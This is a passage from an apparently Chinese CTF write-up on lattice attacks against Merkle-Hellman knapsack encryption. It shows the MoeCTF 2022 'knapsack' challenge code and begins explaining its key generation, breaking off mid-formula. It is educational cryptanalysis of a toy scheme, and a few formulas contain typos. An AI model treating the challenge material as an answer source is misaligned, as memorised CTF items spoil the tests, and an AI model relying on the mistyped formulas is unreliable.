style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span></span></span></span></span></p></li><li><p>由于格是离散子群，运算具有封闭性，所以<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>t</mi><mo>⃗</mo></mover><mo>=</mo><msub><mi>v</mi><mn>1</mn></msub><msub><mi>b</mi><mn>1</mn></msub><mo>+</mo><msub><mi>b</mi><mn>2</mn></msub><msub><mi>b</mi><mn>2</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>v</mi><mi>n</mi></msub><msub><mi>b</mi><mi>n</mi></msub><mo>−</mo><msub><mi>b</mi><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">\vec{t} = v_1b_1+b_2b_2+...+v_nb_n-b_{n+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.89808em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.89808em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">t</span></span></span><span style="top:-3.18408em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.15216em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewbox="0 0 471 714" preserveaspectratio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z"/></svg></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.902771em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span>，在格<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>B</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L(B)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span></span></span></span>上。</p></li><li><p>即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>t</mi><mo>⃗</mo></mover><mo>=</mo><mo stretchy="false">(</mo><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>v</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>v</mi><mi>n</mi></msub><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\vec{t} =(v_1,v_2,...,v_n,0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.89808em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.89808em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">t</span></span></span><span style="top:-3.18408em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.15216em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewbox="0 0 471 714" preserveaspectratio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z"/></svg></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span>在格<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>B</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L(B)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span></span></span></span>上。根据<strong>Hermite定理</strong>可以得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>t</mi><mo>⃗</mo></mover></mrow><annotation encoding="application/x-tex">\vec{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.89808em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.89808em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">t</span></span></span><span style="top:-3.18408em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.15216em;"><span class="overlay" style="height:0.714em;width:0.471em;"><svg width="0.471em" height="0.714em" style="width:0.471em" viewbox="0 0 471 714" preserveaspectratio="xMinYMin"><path d="M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 53.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 1110.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59H213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359c-16-25.333-24-45-24-59z"/></svg></span></span></span></span></span></span></span></span></span></span>是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>B</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L(B)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span></span></span></span>上最短向量。</p></li><li><p>至于为什么最后常用造的格最后一行是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>或者是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，具体的去看格攻击相关论文第二篇吧。</p></li><li><p>[MoeCTF 2022]knapsack：<a href="https://www.nssctf.cn/problem/3294">[MoeCTF 2022]knapsack | NSSCTF</a></p></li><li><p>题目附件如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes,GCD,inverse</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bitlength</span>(<span class="params">n</span>):<span class="comment">#判断消息长度</span></span><br><span class="line">length=<span class="built_in">len</span>(<span class="built_in">bin</span>(bytes_to_long(n))[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">return</span> length</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeKey</span>(<span class="params">n</span>):<span class="comment">#生成超递增序列，得到私钥、公钥</span></span><br><span class="line">length=<span class="built_in">len</span>(n)</span><br><span class="line">privKey = [randint(<span class="number">1</span>, <span class="number">65536</span>**length)]</span><br><span class="line"><span class="built_in">sum</span> = privKey[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length):</span><br><span class="line">privKey.append(randint(<span class="built_in">sum</span>*<span class="number">255</span> + <span class="number">1</span>, <span class="number">65536</span>**(length + i)))</span><br><span class="line"><span class="built_in">sum</span> += privKey[i]</span><br><span class="line">q = <span class="number">255</span>*randint(privKey[length-<span class="number">1</span>] + <span class="number">1</span>, <span class="number">2</span>*privKey[length-<span class="number">1</span>])</span><br><span class="line">r = randint(<span class="number">1</span>, q)</span><br><span class="line"><span class="keyword">while</span> GCD(r, q) != <span class="number">1</span>:</span><br><span class="line">r = randint(<span class="number">1</span>, q)</span><br><span class="line">pubKey = [ r*w % q <span class="keyword">for</span> w <span class="keyword">in</span> privKey ]<span class="comment">#将超递增序列变为非超递增序列，作为公钥</span></span><br><span class="line"><span class="keyword">return</span> privKey, q, r, pubKey</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg, pubKey</span>):<span class="comment">#用公钥加密消息</span></span><br><span class="line">cipher = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> msg:</span><br><span class="line">cipher += bit*pubKey[i]</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher, privKey, q, r</span>):<span class="comment">#用私钥求得超递增序列并解密</span></span><br><span class="line">d = inverse(r, q)</span><br><span class="line">msg = cipher*d % q</span><br><span class="line">res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">n = <span class="built_in">len</span>(privKey)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">temp=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> msg &gt;= privKey[i]:</span><br><span class="line"><span class="keyword">while</span> msg &gt;= privKey[i]:</span><br><span class="line">temp=temp+<span class="number">1</span></span><br><span class="line">msg -= privKey[i]</span><br><span class="line">res =  <span class="built_in">bytes</span>([temp]) + res</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">res =  <span class="built_in">bytes</span>([<span class="number">0</span>]) + res </span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line">privKey, q, r, pubKey=makeKey(flag)</span><br><span class="line">cipher=encrypt(flag,pubKey)</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;pubKey.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(pubKey))</span><br><span class="line">f.close()</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;cipher.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(cipher))</span><br><span class="line">f.close()</span><br><span class="line"><span class="built_in">print</span>(decrypt(encrypt(flag,pubKey),privKey,q,r))</span><br><span class="line"><span class="keyword">assert</span> decrypt(encrypt(flag,pubKey),privKey,q,r)==flag</span><br></pre></td></tr></table></figure><ul><li>查看代码我们会比较清楚这个背包加密的过程其实就是<strong>Merkle-Hellman背包加密算法</strong>。生成超递增序列作为私钥。</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>生成私钥</mtext><mi>p</mi><mi>r</mi><mi>i</mi><mi>v</mi><mi>k</mi><mi>e</mi><msub><mi>y</mi><mi>n</mi></msub><mtext>满足</mtext><mi>p</mi><mi>r</mi><mi>i</mi><mi>v</mi><mi>k</mi><mi>e</mi><msub><mi>y</mi><mi>k</mi></msub><mo>&gt;</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></munderover><mspace linebreak="newline"></mspace><mtext>生成乘数</mtext><mi>r</mi><mo separator="true">,</mo><mtext>模数</mtext><mi>p</mi><mo separator="true">,</mo><mtext>公钥</mtext><mi>p</mi><mi>u</mi><mi>b</mi><mi>k</mi><mi>e</mi><msub><mi>y</mi><mo>=</mo></msub><mi>p</mi><mi>r</mi><mi>i</mi><mi>v</mi><mi>k</mi><mi>e</mi><mi>y</mi><mo>∗</mo><mi>r</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">生成私钥privkey_n满足privkey_k &gt;\sum^{k-1}_{i=1}\\生成乘数r,模数p,公钥pubkey_=privkey*r~mod~p\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">生</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">私</span><span class="mord cjk_fallback">钥</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.1137820000000005em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8361130000000003em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.300005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">生</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">模</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">公</span><span class="mord cjk_fallback">钥</span><span class="mord mathnormal">p</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.10680899999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mrel mtight">=</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">p</span></span><span class="mspace 